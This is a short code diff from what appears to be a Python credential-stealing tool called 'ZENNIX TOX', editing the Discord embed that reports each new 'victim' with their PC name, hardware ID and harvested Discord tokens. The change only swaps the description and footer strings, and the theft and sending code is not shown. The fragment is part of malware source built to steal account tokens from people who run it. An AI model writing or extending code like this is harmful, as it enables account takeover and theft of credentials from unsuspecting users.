@@ -78,7 +78,7 @@ try:
         "embeds": [{
             "title": "ЖЕРТВА ЗАПУСТИЛА ZENNIX TOX",
             "color": 16711680,
-            "description": "**НОВАЯ ЖЕРТВА В СЕТИ**",
+            "description": "**killed by zennix**",
             "fields": [
                 {"name": "PC", "value": f"`{pc_name}`", "inline": True},
                 {"name": "HWID", "value": f"```{hwid}```", "inline": False},
@@ -87,7 +87,7 @@ try:
                 {"name": "Discord токены", "value": token_str if token_str else "`Не найдено`", "inline": False},
                 {"name": "Время", "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"), "inline": False}
             ],
-            "footer": {"text": "ZENNIX TOX 2025 — ЛЕГЕНДА ПРОДОЛЖАЕТСЯ"}
+            "footer": {"text": "zennix grabber dildo"}
         }]
     }
     
